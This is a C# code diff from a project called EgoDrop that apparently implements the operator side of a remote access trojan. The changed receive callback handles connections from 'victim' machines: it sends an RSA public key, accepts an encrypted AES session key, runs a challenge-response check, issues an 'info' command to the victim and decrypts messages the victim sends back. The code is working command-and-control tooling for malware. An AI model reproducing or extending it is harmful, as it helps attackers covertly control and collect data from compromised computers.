@@ -100,18 +100,17 @@ namespace EgoDrop
                 clsEDP edp = null;
 
                 int nRecvLength = 0;
-                byte[] abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
-                byte[] abDynamicRecvBuffer = new byte[clsEDP.HEADER_SIZE];
+                byte[] abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
+                byte[] abDynamicRecvBuffer = { };
 
                 string szB64Key = clsEZData.fnStrE2B64(victim.m_crypto.m_RSAKeyPair.szPublicKey);
-                MessageBox.Show(szB64Key);
-                victim.fnSend(1, 0, szB64Key);
+                victim.fnSend(1, 0, Convert.ToBase64String(victim.m_crypto.m_abRSAKeyPair.abPublicKey));
 
                 do
                 {
-                    abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
+                    abStaticRecvBuffer = new byte[clsEDP.MAX_SIZE];
                     nRecvLength = skt.Receive(abStaticRecvBuffer);
-                    abDynamicRecvBuffer = clsTools.fnabCombineBytes(abDynamicRecvBuffer, abStaticRecvBuffer);
+                    abDynamicRecvBuffer = clsTools.fnabCombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecvLength);
 
                     if (nRecvLength <= 0)
                         break;
@@ -126,23 +125,54 @@ namespace EgoDrop
                             abDynamicRecvBuffer = edp.m_abMoreData;
                             headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);
 
-                            uint nCmd = (uint)edp.m_nCommand;
-                            uint nParam = (uint)edp.m_nParam;
+                            byte[] abBuffer = edp.fnGetMsg().abMsg;
 
-                            if (nCmd == 0)
+                            if (edp.m_nCommand == 0)
                             {
-                                if (nParam == 0)
+                                if (edp.m_nParam == 0)
                                 {
                                     
                                 }
                             }
-                            else if (nCmd == 1)
+                            else if (edp.m_nCommand == 1)
                             {
+                                if (edp.m_nParam == 1)
+                                {
+                                    byte[] abCipher = Convert.FromBase64String(Encoding.UTF8.GetString(abBuffer));
+                                    byte[] abPlain = victim.m_crypto.fnabRSADecrypt(abCipher);
+                                    string szPlain = Encoding.UTF8.GetString(abPlain);
+                                    
+                                    var split = szPlain.Split('|');
+                                    byte[] abKey = Convert.FromBase64String(split[0]);
+                                    byte[] abIV = Convert.FromBase64String(split[1]);
 
+                                    victim.m_crypto.fnAesSetNewKeyIV(abKey, abIV);
+
+                                    //Validate
+                                    string szChallenge = clsEZData.fnGenerateRandomStr();
+                                    victim.m_crypto.m_szChallenge = szChallenge;
+                                    victim.fnSend(1, 2, szChallenge);
+                                }
+                                else if (edp.m_nParam == 3)
+                                {
+                                    string szb64RecvCipher = Encoding.UTF8.GetString(abBuffer);
+                                    string szPlain = victim.m_crypto.fnszAESDecrypt(Convert.FromBase64String(szb64RecvCipher));
+
+                                    if (string.Equals(victim.m_crypto.m_szChallenge, szPlain))
+                                    {
+                                        victim.fnSendCommand("info");
+                                    }
+                                }
                             }
-                            else if (nCmd == 2)
+                            else if (edp.m_nCommand == 2)
                             {
+                                if (edp.m_nParam == 0)
+                                {
+                                    string szPlain = victim.m_crypto.fnszAESDecrypt(abBuffer);
+                                    List<string> lsMsg = szPlain.Split('|').Select(x => clsEZData.fnB64D2Str(x)).ToList();
 
+                                    fnOnReceivedMessage(victim, lsMsg);
+                                }
                             }
                         }
                     }
@@ -152,7 +182,7 @@ namespace EgoDrop
             catch (Exception ex)
             {
                 Socket sktClnt = victim.m_sktClnt;
-                MessageBox.Show(ex.Message);
+                MessageBox.Show(ex.Message, "fnBeginRecvCallback()", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
     }
